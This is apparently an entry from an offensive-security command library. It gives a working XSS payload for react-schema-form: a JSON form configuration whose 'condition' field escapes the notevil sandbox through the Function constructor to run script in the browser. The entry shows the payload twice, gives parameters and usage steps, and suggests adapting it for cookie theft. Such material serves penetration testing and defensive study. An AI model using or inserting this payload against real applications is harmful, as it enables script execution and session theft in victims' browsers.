---
id: cmd-react-xss-payload
data: >-
  [ { "key": "comments", "condition": "function fn() {};var constructorProperty
  = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties =
  Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var
  Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned
  `)')}).pop();(Func())()", "type": "radios", "titleMap": [ { "value": "S",
  "name": "Shipping" }, { "value": "P", "name": "Pickup" } ] } ]
tags:
  - xss
  - json
type: command
output: Alert box with 'pwned' in browser
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.427Z'
verified: false
validated: true
submitted: true
---
# react-schema-form-xss-payload

## Command

```json
[ { "key": "comments", "condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()", "type": "radios", "titleMap": [ { "value": "S", "name": "Shipping" }, { "value": "P", "name": "Pickup" } ] } ]
```

## Description

JSON form configuration for react-schema-form with a malicious condition payload to trigger XSS via notevil sandbox escape in the browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| condition | JS payload for alert execution | Yes |
| key | Form field key | Yes |
| type | Field type (radios) | Yes |

## Examples

### Basic Usage

Paste into form editor and render.

### Advanced Usage

Modify alert to other JS, e.g., cookie theft.

## Expected Output

Alert box with 'pwned' in browser

## Related

- [[procedures/Trigger-XSS-with-Malicious-Form-Schema]]
